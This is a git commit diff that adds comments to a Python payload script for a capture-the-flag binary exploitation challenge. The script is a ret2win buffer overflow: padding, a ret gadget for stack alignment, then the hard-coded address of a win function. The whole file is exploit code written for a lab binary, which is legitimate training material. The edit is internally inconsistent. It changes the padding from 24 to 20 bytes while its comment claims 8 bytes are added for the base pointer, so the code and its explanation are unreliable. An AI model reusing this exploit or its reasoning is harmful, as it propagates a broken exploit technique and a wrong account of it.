f36cb639c2f851d15e056d1f46d4f69cc5a27b25
Noam <149065490+Noam-dv@users.noreply.github.com>
2026-01-31 00:56:30 +0200

    simple docs for cscg pwn 1

--- pwn/CSCG - payload.py
+++ pwn/CSCG - payload.py
@@ -1,4 +1,9 @@
 import struct
 import sys
-payload = b"A"*24 + struct.pack("<Q", 0x401120) + struct.pack("<Q", 0x4011c7)
-sys.stdout.buffer.write(payload)
+
+overwrite = b"A"*(16+4) # buffer to overwrite is 16 bytes and we also wanna overwrite the basepointer so we add an extra 8 (32bit = ebp | 64bit = rbp)
+ret = struct.pack("<Q", 0x401120) # ret gadget we have to stick in the stack to realign it
+ret2win =struct.pack("<Q", 0x4011c7) #this is the actual adress of the win function (simple no pie so we just checked with nm ./intro-pwn | grep win)
+
+payload = overwrite + ret + ret2win
+sys.stdout.buffer.write(payload) #write as bytes 
